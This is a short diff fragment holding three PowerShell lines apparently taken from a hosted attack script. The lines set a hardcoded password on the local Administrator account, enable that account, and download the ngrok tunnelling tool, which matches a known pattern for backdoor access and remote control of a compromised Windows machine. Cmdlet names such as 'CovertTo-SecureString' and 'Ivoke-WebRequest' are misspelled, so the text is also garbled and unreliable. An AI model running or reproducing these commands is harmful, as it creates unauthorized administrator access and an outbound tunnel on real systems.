@@ -1,4 +1,3 @@
-Hosted File:
 Set-LocalUser -Name "Administrator" -Password (CovertTo-SecureString -AsPlainText "78692666@Aaa" -Force)
 Set-LocalUser -Name "Administrator" | Enable-LocalUser
 Ivoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
